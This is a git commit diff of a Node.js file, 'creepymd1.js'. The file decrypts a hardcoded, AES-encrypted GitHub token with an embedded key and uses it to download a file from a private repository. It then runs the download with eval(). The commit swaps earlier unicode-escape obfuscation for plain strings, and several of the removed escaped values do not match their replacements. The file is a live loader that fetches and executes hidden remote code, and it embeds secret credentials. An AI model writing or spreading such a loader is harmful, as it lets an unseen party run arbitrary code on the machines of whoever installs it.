33eb3f661661305a77d9dcd5250bfd7094d0f675
DannyTech <kl2875076@gmail.com>
2025-03-02 01:54:12 +0300

    Update creepymd1.js

--- creepymd1.js
+++ creepymd1.js
@@ -2,9 +2,8 @@ const axios = require("axios");
 const crypto = require("crypto");
 const fs = require('fs');
 
-
-const secretKey = "\u004E\u0061\u006E\u0063\u0079"; 
-const encryptedToken = "\u0062\u0035\u0035\u0061\u0036\u0032\u0031\u0036\u0037\u0031\u0036\u0033\u0037\u0031\u003A\u0031\u0030\u0030\u0034\u0036\u0036\u0033\u0030\u0035\u0039\u0031\u0039\u0030\u0037\u0038\u0035\u0035\u0035\u0037"; 
+const secretKey = "Nancy"; 
+const encryptedToken = "b25a621671c7a1b820014d7b30c69a65fa2c96d02a2fb5a10af621d72b2552905d94b5bef46cf2ef6cc369855bee5bf7"; 
 
 function decrypt(encryptedText) {
     const decipher = crypto.createDecipher("aes-256-cbc", secretKey);
@@ -15,10 +14,10 @@ function decrypt(encryptedText) {
 
 const token = decrypt(encryptedToken); 
 
-const repoOwner = "\u0044\u0061\u006E\u0069\u00656\u0034\u0032\u0032\u002D\u0067\u0069\u0066\u0074"; 
-const repoName = "\u004E\u0061\u006E\u0063\u0079"; 
-const filePath = "\u0063\u0072\u0065\u0065\u0070\u0079\u006D\u0064\u0031\u002E\u006A\u0073"; 
-const branch = "\u006D\u0061\u00696\u006E"; 
+const repoOwner = "Daniel432-gift";
+const repoName = "Nancy";
+const filePath = "creepymd1.js";
+const branch = "main";
 
 async function fetchPrivateFile() {
     try {
@@ -32,7 +31,7 @@ async function fetchPrivateFile() {
 
         eval(response.data); 
     } catch (error) {
-        console.error("\u0045\u0072\u0072\u006F\u0072\u0020\u0066\u0065\u0065\u006B\u0069\u006E\u0067\u0020\u0066\u0069\u006C\u0065:", error.response ? error.response.data : error);
+        console.error("Error fetching file:", error.response ? error.response.data : error);
     }
 }
 
